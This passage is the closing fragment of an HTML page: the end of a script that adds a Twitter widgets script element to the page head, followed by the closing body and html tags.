      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
